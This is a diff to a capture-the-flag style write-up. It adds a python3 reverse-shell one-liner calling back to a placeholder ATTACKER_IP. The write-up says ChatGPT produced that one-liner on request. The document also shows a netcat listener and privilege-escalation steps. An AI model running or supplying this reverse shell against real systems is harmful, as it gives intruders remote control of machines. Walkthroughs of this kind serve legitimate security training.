@@ -102,7 +102,12 @@ python3 -c "import pty;pty.spawn('/bin/bash')"
 ```
 but this doesn't work to the desired effect.
 
-Let's try a reverse shell. We set up a listener on our attacker using the command nc -lvnp 4444, and then execute a bash one-liner found at https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet on the target machine, which also doesn't work. Using the python3 variant does, however, and we can now continue with our goal of privilege escalation.
+Let's try a reverse shell. We set up a listener on our attacker using the command nc -lvnp 4444, and then execute a bash one-liner found at https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet on the target machine, which also doesn't work. We can't use the python variant because "which python" returns nothing, but asking ChatGPT to translate it to python3 and running it works!
+```python
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
+```
+We now have a better shell and can cintunie with our goal of privilege escalation.
+
 
 When we run sudo -l, listing all the command we are allowed to execute as root without a password, we hit a password prompt. Since we don't know the password, we leave that for now.
 In the home directory of the user *think* we can see user.txt, but we don't have permission to read it.
@@ -132,4 +137,4 @@ mistaking /usr/sbin/pwm for a system binary, I looked it up on https://gtfobins.
 
 <img width="890" height="105" alt="image" src="https://github.com/user-attachments/assets/c9ae8b65-9c74-421e-a342-aecd6e198bc4" />
 
-
+Interesting! It seems like it runs the id command as the user, and extracts their .passwords file. 
